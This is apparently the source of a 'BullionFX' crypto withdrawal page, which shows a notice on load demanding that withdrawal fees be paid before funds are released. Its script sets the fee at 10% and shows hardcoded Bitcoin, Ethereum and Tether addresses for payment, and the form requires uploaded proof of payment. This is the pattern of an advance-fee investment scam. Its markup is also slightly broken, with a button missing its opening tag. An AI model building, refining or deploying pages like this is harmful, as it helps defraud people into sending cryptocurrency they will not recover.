    <!-- Modal -->
    <div class="modal-overlay" id="withdrawalModal">
        <div class="modal">
            <div class="modal-header">
                <i class="fas fa-exclamation-triangle"></i>
                <h2>Withdrawal Notice</h2>
            </div>
            <div class="modal-content">
                <p>Your withdrawal fees must be paid before your withdrawal request can be processed. If you do not pay the withdrawal fees, your request will be cancelled.</p>
            </div>
            <div class="modal-buttons">
                <button class="btn-cancel" onclick="window.location.href='dashboard.html'">
                    <i class="fas fa-times"></i> Cancel
                </button>

                    <i class="fas fa-check"></i> I Understand
                </button>
            </div>
        </div>

    <div class="form-container">
        <div class="logo-container">
            <i class="fas fa-coins fa-2x" style="color: #0066cc; margin-right: 10px;"></i>
            <div class="logo">BullionFX</div>
        </div>
        <h1>Crypto Withdrawal</h1>
        <form action="confirmation.html" method="POST">
            <label for="amount">
                <i class="fas fa-dollar-sign"></i> Withdrawal Amount:
            </label>
            <div class="input-icon">
                <i class="fas fa-coins"></i>
                <input type="number" id="amount" name="amount" required min="0" step="0.01" placeholder="Enter amount" oninput="calculateFee()">
            </div>
            <div id="fee-display"></div>

            <label for="fee-currency">
                <i class="fas fa-exchange-alt"></i> Fee Payment Currency:
            </label>
            <div class="input-icon">
                <i class="fas fa-wallet"></i>
                <select id="fee-currency" name="fee-currency" required onchange="showAddress()">
                    <option value="">Select a currency</option>
                    <option value="BTC">Bitcoin (BTC)</option>
                    <option value="ETH">Ethereum (ETH)</option>
                    <option value="USDT">Tether (USDT)</option>
                </select>
            </div>
            <div id="address-display" class="hidden">
                <label><i class="fas fa-key"></i> Send fee payment to this address:</label>
                <div class="address-container">
                    <span id="address"></span>
                    <button type="button" class="copy-button" onclick="copyAddress()" aria-label="Copy address">
                        <i class="fas fa-copy"></i>
                    </button>
                    <span class="copy-tooltip">Copied!</span>
                </div>
            </div>

            <label for="proof">
                <i class="fas fa-file-upload"></i> Upload Proof of Payment:
            </label>
            <input type="file" id="proof" name="proof" required accept="image/*,.pdf">

            <label for="withdrawal-currency">
                <i class="fas fa-exchange-alt"></i> Withdrawal Currency:
            </label>
            <div class="input-icon">
                <i class="fas fa-wallet"></i>
                <select id="withdrawal-currency" name="withdrawal-currency" required onchange="updateWithdrawalCurrency()">
                    <option value="">Select withdrawal currency</option>
                    <option value="BTC">Bitcoin (BTC)</option>
                    <option value="ETH">Ethereum (ETH)</option>
                    <option value="USDT">Tether (USDT)</option>
                </select>
            </div>

            <label for="withdrawal-address">
                <i class="fas fa-key"></i> Withdrawal Address (<span id="selected-withdrawal-currency">Not selected</span>):
            </label>
            <div class="input-icon">
                <i class="fas fa-wallet"></i>
                <input type="text" id="withdrawal-address" name="withdrawal-address" required placeholder="Enter your withdrawal address">
            </div>
            <input type="hidden" name="" value="confirmation.html">
            <button type="submit">
                <i class="fas fa-paper-plane"></i> Submit Withdrawal Request
            </button>
        </form>
        <div class="button-group">
            <button onclick="window.location.href='bank-withdrawal.html'">
                <i class="fas fa-university"></i> Bank Withdrawal
            </button>
            <button onclick="window.location.href='cash-withdrawal.html'">
                <i class="fas fa-money-bill-wave"></i> Cash Withdrawal
            </button>
        </div>
    </div>

    <script>
        const addresses = {
            BTC: "1KVBny3MwQjFwPKmsRnjbpcdDq93hXfGgg",
            ETH: "0x5c44e4f4f9251f43d647f5c8a7b799bb480bd674",
            USDT: "TGQFQQQsKPeMW98WGA9rU4go5aWBeGt3X2"
        };

        function calculateFee() {
            const amount = document.getElementById('amount').value;
            const fee = amount * 0.1;
            document.getElementById('fee-display').innerHTML = `<i class="fas fa-info-circle"></i> Withdrawal Fee: $${fee.toFixed(2)}`;
        }

        function showAddress() {
            const currency = document.getElementById('fee-currency').value;
            const addressDisplay = document.getElementById('address-display');
            if (currency) {
                document.getElementById('address').textContent = addresses[currency];
                addressDisplay.classList.remove('hidden');
            } else {
                addressDisplay.classList.add('hidden');
            }
        }

        function copyAddress() {
            const address = document.getElementById('address').textContent;
            const tooltip = document.querySelector('.copy-tooltip');
            
            // Use modern clipboard API
            navigator.clipboard.writeText(address)
                .then(() => {
                    // Show success state
                    const copyButton = document.querySelector('.copy-button');
                    copyButton.innerHTML = '<i class="fas fa-check"></i>';
                    copyButton.style.color = '#10b981'; // Success green color
                    
                    // Show tooltip
                    tooltip.classList.add('show');
                    
                    // Reset after 2 seconds
                    setTimeout(() => {
                        copyButton.innerHTML = '<i class="fas fa-copy"></i>';
                        copyButton.style.color = '';
                        tooltip.classList.remove('show');
                    }, 2000);
                })
                .catch(err => {
                    console.error('Failed to copy: ', err);
                    alert('Failed to copy address. Please try again or copy manually.');
                });
        }

        function updateWithdrawalCurrency() {
            const currency = document.getElementById('withdrawal-currency').value;
            document.getElementById('selected-withdrawal-currency').textContent = currency || 'Not selected';
        }

        // Modal functions
        function closeModal() {
            document.getElementById('withdrawalModal').style.display = 'none';
        }

        // Show modal on page load
        window.onload = function() {
            document.getElementById('withdrawalModal').style.display = 'flex';
        };
    </script>
